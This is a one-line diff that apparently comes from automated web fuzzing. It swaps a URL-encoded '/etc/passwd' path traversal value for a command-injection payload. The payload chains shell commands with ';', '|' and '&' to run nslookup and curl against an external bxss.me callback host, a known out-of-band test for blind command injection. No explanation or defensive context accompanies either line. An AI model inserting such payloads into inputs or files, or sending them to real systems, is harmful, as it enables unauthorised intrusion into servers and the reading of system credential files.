@@ -1,1 +1,1 @@
-%2fetc%2fpasswd
+;(nslookup -q=cname hittvqluottnj1266d.bxss.me||curl hittvqluottnj1266d.bxss.me)|(nslookup -q=cname hittvqluottnj1266d.bxss.me||curl hittvqluottnj1266d.bxss.me)&(nslookup -q=cname hittvqluottnj1266d.bxss.me||curl hittvqluottnj1266d.bxss.me)
